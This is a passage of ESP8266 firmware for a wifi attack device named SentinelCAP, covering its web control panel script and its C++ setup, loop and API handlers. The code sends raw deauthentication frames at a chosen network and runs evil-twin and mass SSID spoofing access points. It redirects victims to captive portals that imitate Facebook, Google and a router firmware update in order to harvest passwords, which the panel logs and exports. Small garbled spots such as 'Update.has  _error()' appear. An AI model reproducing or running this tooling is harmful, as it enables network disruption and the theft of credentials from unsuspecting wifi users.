    window.open('/api/download_logs', '_blank'); // Open in new tab to trigger download
    showNotification('Password logs download initiated!', 'info');
}

// --- Settings Functions ---
async function fetchSettings() {
    try {
        const response = await fetch('/api/settings');
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        appSettings = await response.json();
        renderSettings();
        addToTerminal('[INFO] Settings fetched successfully.');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to fetch settings: ${error.message}`);
        console.error("Error fetching settings:", error);
        showNotification('Failed to load settings!', 'error');
    }
}

function renderSettings() {
    document.getElementById('admin-ap-ssid').value = appSettings.adminApSsid || '';
    document.getElementById('admin-ap-password').value = appSettings.adminApPassword || '';
    document.getElementById('enable-debug-logs').checked = appSettings.enableDebugLogs || false;
    document.getElementById('default-captive-template').value = appSettings.defaultCaptivePortalTemplate || 'default';
}

async function saveSettings() {
    const newSettings = {
        adminApSsid: document.getElementById('admin-ap-ssid').value,
        adminApPassword: document.getElementById('admin-ap-password').value,
        enableDebugLogs: document.getElementById('enable-debug-logs').checked,
        defaultCaptivePortalTemplate: document.getElementById('default-captive-template').value
    };

    try {
        addToTerminal('[INFO] Saving settings...');
        const response = await fetch('/api/settings', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(newSettings)
        });

        if (response.ok) {
            const result = await response.json();
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Settings saved successfully!', 'success');
            // Re-fetch settings to ensure UI is in sync after potential AP restart
            setTimeout(fetchSettings, 3000); // Give ESP time to restart AP if needed
        } else {
            const errorText = await response.text();
            addToTerminal(`[ERROR] Failed to save settings: ${errorText}`);
            showNotification('Failed to save settings!', 'error');
        }
    } catch (error) {
        addToTerminal(`[ERROR] Network error during saving settings: ${error.message}`);
        showNotification('Network error during saving settings!', 'error');
    }
}

async function deselectNetwork() {
    if (!selectedNetwork && !isMassSpoofingActive) { // Check mass spoofing status too
        showNotification('No network is currently selected or mass spoofing active.', 'info');
        return;
    }

    if (confirm('Are you sure you want to deselect the current network and stop all active attacks?')) {
        try {
            const response = await fetch('/api/deselect_network', { method: 'POST' });
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const result = await response.json();
            selectedNetwork = null; // Clear selected network in UI state
            isDeauthActive = false; // Update UI state
            isHotspotActive = false; // Update UI state
            isMassSpoofingActive = false; // NEW: Update mass spoofing UI state
            updateDeauthUI(); // Refresh UI
            updateHotspotUI(); // Refresh UI
            updateMassSpoofingUI(); // NEW: Refresh mass spoofing UI
            document.getElementById('target-ssid').textContent = 'None Selected'; // Update dashboard
            renderNetworks(); // Re-render scanner list to remove selection highlight
            addToTerminal(`[INFO] ${result.message}`);
            showNotification('Network deselected successfully!', 'success');
        } catch (error) {
            addToTerminal(`[ERROR] Failed to deselect network: ${error.message}`);
            console.error("Error deselecting network:", error);
            showNotification('Failed to deselect network!', 'error');
        }
    }
}

async function confirmReboot() {
    if (confirm('Are you sure you want to reboot the device? This will disconnect all clients.')) {
        try {
            addToTerminal('[INFO] Sending reboot command...');
            const response = await fetch('/restart', { method: 'POST' });
            if (response.ok) {
                showNotification('Device is rebooting...', 'info');
                addToTerminal('[INFO] Device is rebooting. Please wait a moment before trying to reconnect.');
                // Optionally, disable UI elements or redirect
                setTimeout(() => {
                    window.location.reload(); // Reload page after a delay
                }, 5000); 
            } else {
                const errorText = await response.text();
                addToTerminal(`[ERROR] Failed to send reboot command: ${errorText}`);
                showNotification('Failed to reboot device!', 'error');
            }
        } catch (error) {
            addToTerminal(`[ERROR] Network error during reboot: ${error.message}`);
            showNotification('Network error during reboot!', 'error');
        }
    }
}

// NEW: Firmware Update Functions
async function handleFirmwareUpload() {
    const firmwareInput = document.getElementById('firmware-input');
    const file = firmwareInput.files[0];
    if (!file) {
        showNotification('No firmware file selected!', 'warning');
        return;
    }

    const progressBarContainer = document.querySelector('.progress-container');
    const progressBar = document.getElementById('firmware-progress-bar');
    const progressText = document.getElementById('firmware-progress-text');
    const statusMessage = document.getElementById('firmware-status-message');

    progressBarContainer.style.display = 'block';
    progressBar.style.width = '0%';
    progressText.textContent = '0%';
    statusMessage.textContent = 'Starting firmware update...';
    addToTerminal(`[OTA] Starting firmware upload: ${file.name}`);

    const formData = new FormData();
    formData.append('firmware', file);

    try {
        const xhr = new XMLHttpRequest();
        xhr.open('POST', '/update', true);

        xhr.upload.addEventListener('progress', (e) => {
            if (e.lengthComputable) {
                const percent = Math.round((e.loaded / e.total) * 100);
                progressBar.style.width = `${percent}%`;
                progressText.textContent = `${percent}%`;
                statusMessage.textContent = `Uploading: ${percent}%`;
            }
        });

        xhr.addEventListener('load', () => {
            if (xhr.status === 200) {
                statusMessage.textContent = 'Firmware update successful! Device rebooting...';
                progressBar.style.width = '100%';
                progressText.textContent = '100%';
                addToTerminal('[OTA] Firmware update successful. Device is rebooting.');
                showNotification('Firmware update successful! Device rebooting...', 'success');
                setTimeout(() => {
                    window.location.reload(); // Reload page after reboot
                }, 10000); // Give device time to reboot
            } else {
                statusMessage.textContent = `Firmware update failed: ${xhr.responseText}`;
                progressBar.style.width = '0%';
                progressText.textContent = '0%';
                addToTerminal(`[OTA] Firmware update failed: ${xhr.responseText}`);
                showNotification(`Firmware update failed: ${xhr.responseText}`, 'error');
            }
        });

        xhr.addEventListener('error', () => {
            statusMessage.textContent = 'Network error during firmware update.';
            progressBar.style.width = '0%';
            progressText.textContent = '0%';
            addToTerminal('[OTA] Network error during firmware update.');
            showNotification('Network error during firmware update!', 'error');
        });

        xhr.send(formData);

    } catch (error) {
        statusMessage.textContent = `Error initiating upload: ${error.message}`;
        addToTerminal(`[OTA] Error initiating upload: ${error.message}`);
        showNotification('Error initiating firmware upload!', 'error');
    }
}


// --- Utility Functions ---
function addToTerminal(message) {
    const terminal = document.getElementById('terminal');
    const systemLogs = document.getElementById('system-logs'); // Assuming system-logs also exists
    const timestamp = new Date().toLocaleTimeString();
    const logEntry = `<div>[${timestamp}] ${message}</div>`;
    
    terminal.innerHTML += logEntry;
    if (systemLogs) systemLogs.innerHTML += logEntry; // Add to system logs too
    
    terminal.scrollTop = terminal.scrollHeight;
    if (systemLogs) systemLogs.scrollTop = systemLogs.scrollHeight;
}

function showNotification(message, type = 'info') {
    const notification = document.createElement('div');
    notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg text-white transition-all duration-300 ${
        type === 'success' ? 'bg-green-600' :
        type === 'error' ? 'bg-red-600' :
        'bg-blue-600'
    }`;
    notification.textContent = message;
    
    document.body.appendChild(notification);
    
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// --- Status Updates ---
async function startStatusUpdates() {
    setInterval(async () => {
        try {
            const response = await fetch('/api/status');
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            const statusData = await response.json();
            
            document.getElementById('target-ssid').textContent = statusData.targetSsid || 'None Selected';
            
            isHotspotActive = statusData.hotspotActive;
            updateHotspotUI(); // Update button and status text
            
            isDeauthActive = statusData.deauthActive;
            updateDeauthUI(); // Update button and status text

            isMassSpoofingActive = statusData.massSpoofingActive; // NEW: Update mass spoofing status
            updateMassSpoofingUI(statusData.currentSpoofedSsid); // NEW: Pass current SSID

            document.getElementById('password-count').textContent = statusData.passwordCount;
            document.getElementById('ip-address').textContent = statusData.ipAddress;
            document.getElementById('mac-address').textContent = statusData.macAddress;
            document.getElementById('uptime').textContent = statusData.uptime;
            document.getElementById('free-heap').textContent = statusData.freeHeap;
            document.getElementById('total-heap').textContent = statusData.totalHeap;

            const memoryPercent = statusData.memoryUsagePercent.toFixed(0);
            document.getElementById('memory-percent').textContent = `${memoryPercent}%`;

            // Update system status text based on active operations
            let systemStatusText = 'Idle';
            if (isHotspotActive) systemStatusText = 'Evil Twin Active';
            if (isDeauthActive) systemStatusText = 'Deauth Active';
            if (isMassSpoofingActive) systemStatusText = 'Mass Spoofing Active'; // NEW: Prioritize mass spoofing status
            if (isHotspotActive && isDeauthActive) systemStatusText = 'Evil Twin & Deauth Active'; // This case might be less relevant if mass spoofing is exclusive
            document.getElementById('system-status-text').textContent = systemStatusText;


        } catch (error) {
            console.error("Error fetching dashboard status:", error);
            // addToTerminal(`[ERROR] Failed to update status: ${error.message}`); // Avoid spamming terminal on network issues
        }
    }, 3000); // Update every 3 seconds
}

// --- Generate Report ---
async function generateReport() {
    addToTerminal('[INFO] Generating penetration test report...');
    try {
        const statusResponse = await fetch('/api/status');
        const statusData = await statusResponse.json();

        const logsResponse = await fetch('/api/logs');
        const logsData = await logsResponse.json();

        const filesResponse = await fetch('/api/files');
        const filesData = await filesResponse.json();

        const report = {
            timestamp: new Date().toISOString(),
            deviceInfo: {
                ipAddress: statusData.ipAddress,
                macAddress: statusData.macAddress,
                uptime: statusData.uptime,
                memoryUsage: `${statusData.memoryUsagePercent.toFixed(2)}% (${statusData.freeHeap}/${statusData.totalHeap} bytes free)`,
            },
            targetNetwork: {
                ssid: statusData.targetSsid,
                bssid: statusData.targetBssid,
                channel: statusData.targetChannel
            },
            attackStatus: {
                evilTwin: statusData.hotspotActive ? 'Active' : 'Inactive',
                deauthAttack: statusData.deauthActive ? 'Active' : 'Inactive',
                massSpoofing: statusData.massSpoofingActive ? 'Active' : 'Inactive', // NEW
                currentSpoofedSsid: statusData.currentSpoofedSsid, // NEW
                capturedPasswordsCount: statusData.passwordCount
            },
            capturedPasswords: logsData.passwords.split('\n').filter(line => line.trim() !== ''),
            filesOnDevice: filesData.map(file => ({ name: file.name, size: file.size, type: file.type }))
        };
        
        const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'sentinelcap_report.json';
        a.click();
        URL.revokeObjectURL(url);
        
        addToTerminal('[INFO] Penetration test report generated and downloaded.');
        showNotification('Report generated and downloaded!', 'success');
    } catch (error) {
        addToTerminal(`[ERROR] Failed to generate report: ${error.message}`);
        console.error("Error generating report:", error);
        showNotification('Failed to generate report!', 'error');
    }
}

// --- Template functions for different captive portals ---
// These are kept in JS as they are client-side templates for the editor
function getFacebookTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
        .container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .logo { color: #1877f2; font-size: 2.5em; font-weight: bold; text-align: center; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; background: #1877f2; color: white; padding: 14px; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
        .wifi-notice { background: #e3f2fd; padding: 15px; border-radius: 6px; margin-bottom: 20px; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">facebook</div>
        <div class="wifi-notice">
            <strong>WiFi Authentication Required</strong><br>
            Please log in to access {SSID} network
        </div>
        <form action="/submit_password" method="post">
            <input type="text" name="username" placeholder="Email or phone number" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
</body>
</html>`;
}

function getGoogleTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google WiFi</title>
    <style>
        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; background: #f8f9fa; margin: 0; padding: 20px; }
        .container { max-width: 450px; margin: 50px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo img { width: 80px; }
        h1 { color: #202124; font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 30px; }
        .network-info { background: #f1f3f4; padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        input { width: 100%; padding: 16px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        input:focus { outline: none; border-color: #1a73e8; }
        button { width: 100%; background: #1a73e8; color: white; padding: 16px; border: none; border-radius: 4px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 16px; }
        button:hover { background: #1557b0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <div style="font-size: 40px;">🌐</div>
        </div>
        <h1>Connect to WiFi</h1>
        <div class="network-info">
            <strong>Network:</strong> {SSID}<br>
            <strong>Security:</strong> WPA2-Personal
        </div>
        <form action="/submit_password" method="post">
            <input type="password" name="password" placeholder="Enter network password" required>
            <button type="submit">Connect</button>
        </form>
    </div>
</body>
</html>`;
}

function getRouterTemplate() {
    return `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Router Configuration</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 500px; margin: 30px auto; background: white; border-radius: 5px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .header { background: #2c3e50; color: white; padding: 20px; text-align: center; }
        .content { padding: 30px; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; color: #333; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
        button { width: 100%; background: #3498db; color: white; padding: 14px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        button:hover { background: #2980b9; }
        .device-info { background: #ecf0f1; padding: 15px; border-radius: 4px; margin-bottom: 20px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔧 Router Configuration</h1>
            <p>Firmware Update Required</p>
        </div>
        <div class="content">
            <div class="warning">
                <strong>Security Alert:</strong> Your router firmware is outdated. Please authenticate to install critical security updates.
            </div>
            <div class="device-info">
                <strong>Device:</strong> {SSID}<br>
                <strong>Model:</strong> Wireless Router AC1200<br>
                <strong>Current Version:</strong> 2.1.0<br>
                <strong>Available Version:</strong> 2.1.5 (Security Update)
            </div>
            <form action="/submit_password" method="post">
                <div class="form-group">
                    <label for="username">Administrator Username:</label>
                    <input type="text" id="username" name="username" value="admin" required>
                </div>
                <div class="form-group">
                    <label for="password">Administrator Password:</label>
                    <input type="password" id="password" name="password" placeholder="Enter admin password" required>
                </div>
                <button type="submit">Authenticate & Update Firmware</button>
            </form>
        </div>
    </div>
</body>
</html>`;
}
)rawliteral";

// --- Setup Function ---
void setup() {
  Serial.begin(115200);
  Serial.println("\n[INFO] Starting " APP_NAME "...");

  // --- Initialize OLED Display ---
  Wire.begin(OLED_SDA_PIN, OLED_SCL_PIN); // Initialize I2C with custom pins
  if(!display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDRESS)) {
    Serial.println(F("[FATAL] SSD1306 allocation failed. Aborting."));
    for(;;); // Don't proceed, loop forever
  }
  display.display(); // Show initial Adafruit logo
  delay(2000);
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0,0);
  display.println("SentinelCAP");
  display.println("Initializing...");
  display.display();
  Serial.println("[INFO] OLED Display initialized.");


  // SPIFFS is still used for file upload/delete and potentially for dynamic captive portal templates
  // but the main UI files are now embedded.
  if (!SPIFFS.begin()) {
    Serial.println("[ERROR] SPIFFS Mount Failed! Formatting...");
    SPIFFS.format(); // Try formatting if mount fails
    if (!SPIFFS.begin()) {
      Serial.println("[FATAL] SPIFF6S Mount Failed after format. Aborting.");
      while(true); // Halt execution
    }
    Serial.println("[INFO] SPIFFS formatted and mounted successfully.");
  } else {
    Serial.println("[INFO] SPIFFS mounted successfully.");
  }

  FSInfo fs_info;
  SPIFFS.info(fs_info);
  Serial.printf("[INFO] SPIFFS Total: %u bytes, Used: %u bytes\n", fs_info.totalBytes, fs_info.usedBytes);

  // --- Load settings at startup ---
  loadSettings(); // Call the new loadSettings function
  loadCapturedPasswords(); // <--- TAMBAHAN BARU: Load passwords on startup

  WiFi.mode(WIFI_AP_STA); // AP_STA mode for admin AP and scanning
  // Use settings for AP configuration
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str()); // Use loaded settings
  Serial.print("[INFO] Admin AP '" + appSettings.adminApSsid + "' started with IP: ");
  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println("[INFO] DNS Server started.");

  // Enable promiscuous mode for deauthentication
  wifi_promiscuous_enable(1);

  // --- Web Server Routes ---
  // Serve embedded static files
  webServer.on("/", HTTP_GET, []() { webServer.send(200, "text/html", INDEX_HTML); });
  webServer.on("/style.css", HTTP_GET, []() {
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Serving /style.css"); // Log when CSS is requested
    webServer.send(200, "text/css", STYLE_CSS);
  });
  webServer.on("/script.js", HTTP_GET, []() { webServer.send(200, "application/javascript", SCRIPT_JS); });
  
  // API Endpoints (JSON responses)
  webServer.on("/api/scan", handleApiScan);
  webServer.on("/api/select_network", HTTP_POST, handleApiSelectNetwork);
  webServer.on("/api/toggle_deauth", HTTP_POST, handleApiToggleDeauth);
  webServer.on("/api/toggle_hotspot", HTTP_POST, handleApiToggleHotspot);
  webServer.on("/api/mass_spoofing", HTTP_POST, handleApiMassSpoofing); // Modified
  webServer.on("/api/stop_mass_spoofing", HTTP_POST, handleApiStopMassSpoofing); // NEW
  webServer.on("/api/status", handleApiStatus);
  webServer.on("/api/logs", handleApiLogs);
  webServer.on("/api/clear_logs", HTTP_POST, handleApiClearLogs);
  webServer.on("/api/download_logs", handleApiDownloadLogs);
  webServer.on("/api/files", handleApiFiles); // New API for file listing
  webServer.on("/api/deselect_network", HTTP_POST, handleApiDeselectNetwork); // <--- TAMBAHAN BARU

  // New: Settings API Endpoints
  webServer.on("/api/settings", HTTP_GET, handleApiGetSettings);
  webServer.on("/api/settings", HTTP_POST, handleApiSaveSettings);

  // File Upload/Delete (still uses SPIFFS)
  webServer.on("/upload", HTTP_POST, handleFileUpload); // Corrected: only pass the handler function
  webServer.on("/deletefile", HTTP_POST, handleFileDelete);

  // Captive Portal (for clients connecting to the Evil Twin)
  webServer.on("/generate_captive_portal", handleCaptivePortal);
  webServer.on("/submit_password", HTTP_POST, handleCaptivePortalSubmit);

  // System Control
  webServer.on("/restart", HTTP_POST, handleRestart); // Changed to POST for security

  // NEW: OTA Update Endpoint
  webServer.on("/update", HTTP_POST, []() {
    webServer.sendHeader("Connection", "close");
    webServer.send(200, "text/plain", (Update.has  _error()) ? "FAIL" : "OK");
    ESP.restart();
  }, handleOTAUpdate);

  // Catch-all for unknown paths (redirect to captive portal if active, otherwise 404)
  webServer.onNotFound(handleNotFound);

  webServer.begin();
  Serial.println("[INFO] HTTP server started.");

  // NEW: OTA Update Callbacks
  Update.onStart(handleOTAStart);
  Update.onProgress(handleOTAProgress);
  Update.onEnd(handleOTAEnd);
  Update.onError(handleOTAErrors);


  performScan(); // Initial scan
  startTime = millis(); // Initialize uptime counter
  updateOLEDDisplay(); // Initial OLED update
}

// --- Loop Function ---
void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // Deauthentication attack logic
  if (deauthing_active && _selectedNetwork.ssid != "" && millis() - lastDeauthTime >= 1000) {
    if (appSettings.enableDebugLogs) Serial.println("[DEAUTH] Sending deauth packets to " + _selectedNetwork.ssid);
    wifi_set_channel(_selectedNetwork.ch);

    // Deauth packet structure (simplified for example)
    // Frame Control (0xC0 for Deauth), Duration (0x0000), Destination (Broadcast), Source (AP), BSSID (AP), Sequence (0x0000), Reason Code (0x0001)
    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // FC, Duration, DA (Broadcast)
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // SA (AP BSSID)
                                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (AP BSSID)
                                0x00, 0x00, // Sequence Control
                                0x01, 0x00}; // Reason Code (Unspecified reason)

    // Copy BSSID into SA and BSSID fields
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6); // Source Address (AP)
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6); // BSSID (AP)

    // Send deauth from AP to client (broadcast)
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
    
    // Optionally, send disassociation frame from client to AP (broadcast)
    // deauthPacket[0] = 0xA0; // Disassociation frame
    // wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

    lastDeauthTime = millis();
  }

  // Mass Spoofing Logic (NEW)
  if (mass_spoofing_active && massSpoofingCount > 0 && millis() - lastSpoofingChangeTime >= SPOOFING_CHANGE_INTERVAL) {
    // Cycle to the next SSID
    currentSpoofingIndex = (currentSpoofingIndex + 1) % massSpoofingCount;
    String currentSpoofingSSID = massSpoofingSSIDs[currentSpoofingIndex];

    // Determine channel for hopping (1-11)
    if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Channel hopping enabled: " + String(appSettings.enableChannelHopping));
    if (appSettings.enableChannelHopping) { // Assuming a new setting for channel hopping
        currentSpoofingChannel = (currentSpoofingChannel % 11) + 1; // Cycle 1-11
    } else {
        currentSpoofingChannel = 1; // Default to channel 1 if no hopping
    }

    // Generate new random MAC if enabled
    uint8_t* macToUse = spoofingMac;
    if (appSettings.enableRandomMac) { // Assuming a new setting for random MAC
        generateRandomMac(spoofingMac);
        macToUse = spoofingMac;
    }

    startMassSpoofingAP(currentSpoofingSSID, currentSpoofingChannel, macToUse);

    if (appSettings.enableDebugLogs) Serial.println("[SPOOF] Switched AP to: " + currentSpoofingSSID + " on Ch: " + String(currentSpoofingChannel) + " MAC: " + bytesToStr(macToUse, 6));
    lastSpoofingChangeTime = millis();
  }


  // Periodically scan for networks (every 15 seconds)
  if (millis() - lastScanTime >= 15000) {
    performScan();
    lastScanTime = millis();
  }

  // Periodically check WiFi status (every 2 seconds)
  if (millis() - lastWifiStatusCheck >= 2000) {
    // This is mostly for internal logging, UI will fetch status via API
    if (WiFi.status() != WL_CONNECTED) {
      // if (appSettings.enableDebugLogs) Serial.println("[INFO] WiFi not connected to any AP.");
    } else {
      // if (appSettings.enableDebugLogs) Serial.println("[INFO] WiFi connected to AP: " + WiFi.SSID());
    }
    lastWifiStatusCheck = millis();
  }

  // Update OLED display every 1 second
  if (millis() - lastOLEDUpdate >= 1000) {
    updateOLEDDisplay();
    lastOLEDUpdate = millis();
  }
}

// --- Helper Functions ---

void clearNetworkArray() {
  for (int i = 0; i < 16; i++) {
    _networks[i] = {"", 0, {0, 0, 0, 0, 0, 0}, 0, ""}; // Reset network struct
  }
}

void performScan() {
  if (appSettings.enableDebugLogs) Serial.println("[SCAN] Starting WiFi scan...");
  int n = WiFi.scanNetworks(false, true); // false: not async, true: show hidden
  clearNetworkArray();
  if (n > 0) {
    if (appSettings.enableDebugLogs) {
      Serial.print("[SCAN] Found ");
      Serial.print(n);
      Serial.println(" networks.");
    }
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }
      network.ch = WiFi.channel(i);
      network.rssi = WiFi.RSSI(i);
      network.security = getSecurityType(WiFi.encryptionType(i));
      _networks[i] = network;
      if (appSettings.enableDebugLogs) {
        Serial.printf("[SCAN] %d: %s, Ch: %d, RSSI: %d, BSSID: %s, Security: %s\n",
                      i + 1, network.ssid.c_str(), network.ch, network.rssi,
                      bytesToStr(network.bssid, 6).c_str(), network.security.c_str());
      }
    }
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[SCAN] No networks found.");
  }
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);
    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

String getSecurityType(uint8_t encryptionType) {
  // Using correct ESP8266 encryption type constants
  switch (encryptionType) {
    case ENC_TYPE_NONE: return "Open";
    case ENC_TYPE_WEP: return "WEP";
    case ENC_TYPE_TKIP: return "WPA-PSK";
    case ENC_TYPE_CCMP: return "WPA2-PSK";
    case ENC_TYPE_AUTO: return "WPA/WPA2-PSK";
    default: return "Unknown";
  }
}


// --- File Serving Handlers ---
// This function is now primarily for SPIFFS files, not the embedded ones.
bool handleFileRead(String path) {
  if (appSettings.enableDebugLogs) Serial.println("handleFileRead: " + path);
  if (path.endsWith("/")) path += "index.html"; // If path is a directory, serve index.html
  String contentType = "text/plain";
  if (path.endsWith(".html")) contentType = "text/html";
  else if (path.endsWith(".css")) contentType = "text/css";
  else if (path.endsWith(".js")) contentType = "application/javascript";
  else if (path.endsWith(".png")) contentType = "image/png";
  else if (path.endsWith(".gif")) contentType = "image/gif";
  else if (path.endsWith(".jpg")) contentType = "image/jpeg";
  else if (path.endsWith(".ico")) contentType = "image/x-icon";
  else if (path.endsWith(".xml")) contentType = "text/xml";
  else if (path.endsWith(".pdf")) contentType = "application/pdf";
  else if (path.endsWith(".zip")) contentType = "application/zip";
  else if (path.endsWith(".json")) contentType = "application/json"; // Added for JSON files

  if (SPIFFS.exists(path)) {
    File file = SPIFFS.open(path, "r");
    if (file) {
      webServer.streamFile(file, contentType);
      file.close();
      return true;
    }
  }
  return false;
}

void handleNotFound() {
  if (hotspot_active) {
    // If Evil Twin is active, redirect all requests to the captive portal
    webServer.sendHeader("Location", "http://" + apIP.toString() + "/generate_captive_portal", true);
    webServer.send(302, "text/plain", "");
  } else {
    // For non-embedded files, try to serve from SPIFFS, otherwise 404
    if (!handleFileRead(webServer.uri())) { 
        webServer.send(404, "text/plain", "404: Not Found");
    }
  }
}

// --- API Handlers (JSON Responses) ---

void handleApiScan() {
  performScan(); // Perform a fresh scan
  DynamicJsonDocument doc(3500); // Adjusted size for 16 networks * ~200 bytes/network
  JsonArray networksArray = doc.to<JsonArray>();

  for (int i = 0; i < 16; ++i) {
    if (_networks[i].ssid == "") {
      break;
    }
    JsonObject networkObj = networksArray.createNestedObject();
    networkObj["ssid"] = _networks[i].ssid;
    networkObj["bssid"] = bytesToStr(_networks[i].bssid, 6);
    networkObj["channel"] = _networks[i].ch;
    networkObj["rssi"] = _networks[i].rssi;
    networkObj["security"] = _networks[i].security;
  }

  String jsonResponse;
  serializeJson(doc, jsonResponse);
  webServer.send(200, "application/json", jsonResponse);
}

void handleApiSelectNetwork() {
  if (webServer.hasArg("plain")) {
    String body = webServer.arg("plain");
    DynamicJsonDocument doc(256);
    DeserializationError error = deserializeJson(doc, body);

    if (error) {
      webServer.send(400, "application/json", "{\"success\": false, \"message\": \"Invalid JSON\"}");
      return;
    }

    String bssidStr = doc["bssid"].as<String>();
    bool found = false;
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == bssidStr) {
        _selectedNetwork = _networks[i];
        found = true;
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Selected network: " + _selectedNetwork.ssid);
        break; // Exit loop once found
      }
    }

    if (found) {
      // If a network is selected, stop mass spoofing
      if (mass_spoofing_active) {
          mass_spoofing_active = false;
          // Revert to admin AP
          dnsServer.stop();
          WiFi.softAPdisconnect(true);
          delay(50);
          WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
          WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
          dnsServer.start(DNS_PORT, "*", apIP);
          if (appSettings.enableDebugLogs) Serial.println("[INFO] Mass spoofing stopped due to network selection.");
      }
      webServer.send(200, "application/json", "{\"success\": true, \"message\": \"Network selected\"}");
    } else {
      webServer.send(404, "application/json", "{\"success\": false, \"message\": \"Network not found\"}");
    }
  } else {
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No data provided\"}");
  }
}

void handleApiToggleDeauth() {
  if (_selectedNetwork.ssid != "") {
    // If deauth is started, stop mass spoofing
    if (!deauthing_active && mass_spoofing_active) {
        mass_spoofing_active = false;
        // Revert to admin AP
        dnsServer.stop();
        WiFi.softAPdisconnect(true);
        delay(50);
        WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
        WiFi.softAP(appSettings.adminApSsid.c_str(), appSettings.adminApPassword.c_str());
        dnsServer.start(DNS_PORT, "*", apIP);
        if (appSettings.enableDebugLogs) Serial.println("[INFO] Mass spoofing stopped due to deauth activation.");
    }
    deauthing_active = !deauthing_active;
    if (appSettings.enableDebugLogs) Serial.println("[INFO] Deauthentication " + String(deauthing_active ? "started" : "stopped") + " for " + _selectedNetwork.ssid);
    webServer.send(200, "application/json", "{\"success\": true, \"deauth_active\": " + String(deauthing_active ? "true" : "false") + "}");
  } else {
    if (appSettings.enableDebugLogs) Serial.println("[WARNING] Cannot toggle deauth: No network selected.");
    webServer.send(400, "application/json", "{\"success\": false, \"message\": \"No target network selected\"}");
  }
}

